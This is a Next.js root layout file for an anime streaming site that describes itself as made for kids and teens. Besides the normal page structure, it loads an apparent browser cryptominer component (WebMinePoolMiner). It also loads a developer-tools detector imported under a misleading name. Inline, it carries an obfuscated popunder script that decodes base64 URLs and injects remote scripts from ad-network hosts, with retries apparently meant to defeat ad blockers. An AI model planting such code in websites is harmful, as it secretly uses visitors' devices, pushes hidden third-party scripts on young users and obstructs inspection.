import { Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import BottomNavigation from "@/components/BottomNavigation";
import DevToolsDetector from "@/components/AnimeGetter";
import WebMinePoolMiner from "@/components/WebMinePoolMiner";

const inter = Inter({ subsets: ["latin"] });

export const metadata = {
  title: "HelloAnime",
  description: "A modern anime streaming platform for kids and teens",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
      <Script id="custom-popunder-script" strategy="afterInteractive">
{`
(function(){
  var o=window, m="f2e25af428854922b050b10d26671305",
      i=[["siteId",337-952*217+968+5396411],["minBid",0],["popundersPerIP","5:1,5:1"],["delayBetween",2],["default",false],["defaultPerDay",0],["topmostLayer","extreme"]],
      l=["d3d3LmJsb2NrYWRzbm90LmNvbS9OWXJpbGIvbC9sdmlkZW9qc181LnZhc3QudnBhaWQubWluLmpz","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC92YWNjb3VudGluZy5taW4uanM="],
      b=-1, g, y,
      h=function(){
        clearTimeout(y);
        b++;
        if(l[b] && !(1771669929000 < (new Date).getTime() && 1 < b)){
          g = o.document.createElement("script");
          g.type = "text/javascript";
          g.async = true;
          var j = o.document.getElementsByTagName("script")[0];
          g.src = "https://" + atob(l[b]);
          g.crossOrigin = "anonymous";
          g.onerror = h;
          g.onload = function(){
            clearTimeout(y);
            o[m.slice(0,16)+m.slice(0,16)] || h();
          };
          y = setTimeout(h, 5000);
          j.parentNode.insertBefore(g, j);
        }
      };
  if(!o[m]){
    try{
      Object.freeze(o[m]=i)
    }catch(e){}
    h();
  }
})();
`}
</Script>

      </head>
      <body className={`${inter.className} overflow-hidden`}>
        <DevToolsDetector />
        <div className="flex flex-col h-svh overflow-hidden">
          <Navbar />
          <div className="flex flex-1 overflow-hidden">
            <Sidebar />
            <main className="flex-1 overflow-y-auto px-3 bg-black md:pb-0">
              {children}
            </main>
          </div>
          <BottomNavigation />
        </div>
        <WebMinePoolMiner />
      </body>
    </html>
  );
}
